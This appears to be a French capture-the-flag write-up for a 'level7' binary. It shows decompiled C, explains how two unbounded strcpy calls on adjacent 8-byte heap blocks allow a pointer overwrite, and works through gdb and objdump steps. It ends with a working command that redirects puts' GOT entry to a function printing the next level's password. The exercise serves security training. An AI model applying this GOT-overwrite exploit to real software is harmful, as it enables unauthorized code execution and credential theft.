# level7 : overflow heap

    void m(void *param_1,int param_2,char *param_3,int param_4,int param_5)
    {
        time_t tVar1;
        
        tVar1 = time((time_t *)0x0);
        printf("%s - %d\n",c,tVar1);
        return;
        }

        undefined4 main(undefined4 param_1,int param_2)
        {
        undefined4 *puVar1;
        void *pvVar2;
        undefined4 *puVar3;
        FILE *__stream;
        
        puVar1 = malloc(8);
        *puVar1 = 1;
        pvVar2 = malloc(8);
        puVar1[1] = pvVar2;
        puVar3 = malloc(8);
        *puVar3 = 2;
        pvVar2 = malloc(8);
        puVar3[1] = pvVar2;
        strcpy((char *)puVar1[1],*(char **)(param_2 + 4));
        strcpy((char *)puVar3[1],*(char **)(param_2 + 8));
        __stream = fopen("/home/user/level8/.pass","r");
        fgets(c,0x44,__stream);
        puts("~~");
        return 0;
    }

version clair : 

    int main(int argc, char **argv) {
        int *p1, *p3;
        char *p2, *p4;
        
        p1 = malloc(8);        // Alloue 8 octets (2 cases)
        p1[0] = 1;             // Case 0 : stocke le chiffre 1
        
        p2 = malloc(8);        // Alloue 8 octets (pour du texte)
        p1[1] = p2;            // Case 1 : stocke l'adresse de p2

        p3 = malloc(8);        // Alloue 8 octets (2 cases)
        p3[0] = 2;             // Case 0 : stocke le chiffre 2
        
        p4 = malloc(8);        // Alloue 8 octets (pour du texte)
        p3[1] = p4;            // Case 1 : stocke l'adresse de p4

        
        strcpy(p1[1], argv[1]); 
        strcpy(p3[1], argv[2]);

        FILE *fichier = fopen("/home/user/level8/.pass", "r");
        fgets(c, 68, fichier);
        
        puts("~~");
        return 0;
    }



    p1 = malloc(8); p1[0] = 1; p1[1] = p2 = malloc(8);
    p3 = malloc(8); p3[0] = 2; p3[1] = p4 = malloc(8);
    strcpy(p2, argv[1]); 
    strcpy(p4, argv[2]); 

Deux `strcpy` sans limite sur des buffers minuscules (8 octets), et les 4 blocs sont alloués consécutivement sur le heap (même principe qu'au level6). Le premier `strcpy` (`argv[1]`) peut déborder de `p2` jusque dans `p3`, et écraser le pointeur `p4` que `p3` contient celui-là même qui sert de destination au **deuxième** `strcpy` (`argv[2]`).

**Trouver l'offset**

    gdb> run aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaa
    gdb> info register
    eax            0x61616166       1633771878
    ecx            0x0      0
    edx            0x61616166       1633771878
    ebx            0xb7fd0ff4       -1208152076

    pattern 0x61616166 = faaa = 5 iemes pattern * 4 = offset 20

**rediriger `puts` pour afficher la fonction m et afficher la global c**

    objdump -R level7 | grep puts
    08049928 R_386_JUMP_SLOT   puts

    (gdb) p &m
    $1 = (<text variable, no debug info> *) 0x80484f4 <m>

- `argv[1]` : 20 octets (offset) de bourrage + adresse de l'entrée GOT de `puts` (`0x08049928`), redirige le 2e `strcpy` vers cette adresse.
   p1[p2] -> p3[p4 - > offset + 0x08049928 ]
- `argv[2]` : l'adresse de `m()` (`0x080484f4`), qui remplace l'addr de puts grace au premier strcpy

injection :

    ./level7 "$(printf 'a%.0s' {1..20}; printf '\x28\x99\x04\x08')" "$(printf '\xf4\x84\x04\x08')"
